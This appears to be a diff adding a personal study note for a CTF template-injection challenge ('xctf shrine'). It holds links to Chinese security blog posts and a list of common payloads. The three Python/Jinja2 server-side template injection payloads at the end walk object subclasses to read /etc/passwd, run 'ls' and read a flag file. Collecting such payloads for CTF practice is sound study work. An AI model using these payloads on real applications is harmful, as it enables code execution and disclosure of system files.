@@ -1,0 +1,15 @@
+https://www.cnblogs.com/wjw-zm/p/12741047.html
+
+看这个:
+https://blog.csdn.net/m0_51428325/article/details/121357005
+
+https://www.freebuf.com/column/187845.html
+
+https://blog.csdn.net/weixin_45895555/article/details/106414196?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-106414196-blog-121440692.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1-106414196-blog-121440692.pc_relevant_aa&utm_relevant_index=1
+
+xctf shirne
+https://blog.csdn.net/qq_43801002/article/details/107715987
+常用payload:
+>>>''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
+>>>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
+>>>''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()
